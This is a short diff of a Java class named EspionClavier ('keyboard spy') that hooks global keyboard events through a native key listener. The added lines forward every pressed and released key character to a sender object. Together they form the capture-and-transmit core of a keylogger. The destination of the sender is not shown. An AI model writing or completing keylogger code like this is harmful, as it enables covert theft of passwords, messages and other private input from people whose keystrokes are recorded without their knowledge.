@@ -26,12 +26,12 @@ public class EspionClavier implements NativeKeyListener{
     
     @Override
     public void nativeKeyPressed(NativeKeyEvent nke) {
-        //Not supported yet
+        this.sender.sendKeyPressed(nke.getKeyChar());
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent nke) {
-        //Not supported yet
+        this.sender.sendKeyReleased(nke.getKeyChar());
     }
 
     @Override
